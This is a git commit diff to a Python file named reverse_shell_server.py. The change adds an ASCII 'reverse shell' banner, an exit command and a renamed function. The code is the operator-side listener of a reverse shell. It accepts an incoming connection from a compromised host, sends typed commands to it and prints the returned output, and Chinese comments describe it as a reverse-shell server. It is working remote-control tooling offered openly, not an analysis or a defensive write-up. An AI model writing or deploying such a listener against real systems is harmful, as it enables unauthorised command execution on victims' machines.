2758040e432330f8d19491b29151d3aa6ca3e98d
jerry1233 <59169357+jerry1233@users.noreply.github.com>
2020-12-10 22:08:50 +0800

    Update reverse_shell_server.py

--- reverse_shell_server.py
+++ reverse_shell_server.py
@@ -1,28 +1,42 @@
 import socket
 import time
+import os
 
 #反弹shell服务端
 
-def thread_send():
+def start_server():
     while True:
-        print("send等待连接,1000秒后超时")
+        print("| '__/ _ \\ \\ / / _ \\ '__/ __|/ _ \\")
+        print("| | |  __/\\ V /  __/ |  \\__ \\  __/")
+        print("|_|  \\___| \\_/ \\___|_|  |___/\\___|")
+        print(" ___| |__   ___| | |")
+        print("/ __| '_ \\ / _ \\ | |")
+        print("\\__ \\ | | |  __/ | |")
+        print("|___/_| |_|\\___|_|_|")
+        print("************* Server等待连接,1000秒后超时,exit退出 *************")
+        
         conn,addr = s.accept()
         while True:
             try:
                 user_input = input('>>> ').strip()
                 if user_input!="": #输入不为空
-                    try:
-                        conn.send(user_input.encode('utf-8')) #编码发送
-                    except:
-                        print("服务器发送异常")
-                    try:
-                        cmd=conn.recv(4096).decode() #解码接受
-                    except:
-                        print("服务器接收异常")
-                    print(cmd) #输出命令
+
+                    if user_input=="exit":
+                        os._exit(0)
+                    else:
+                        try:
+                            conn.send(user_input.encode('utf-8')) #编码发送
+                        except:
+                            print("服务器发送异常")
+                        try:
+                            cmd=conn.recv(4096).decode() #解码接受
+                        except:
+                            print("服务器接收异常")
+                        print(cmd) #输出命令
        
                 elif user_input=="":
                     print("命令不能空")
+                
             except:
                 print("服务器异常")
                 
@@ -34,4 +48,4 @@ if __name__ == '__main__':
     s.bind(HostPort)
     s.listen(5)
     s.settimeout(1000) #设置超时时间1000秒
-    thread_send()
+    start_server()
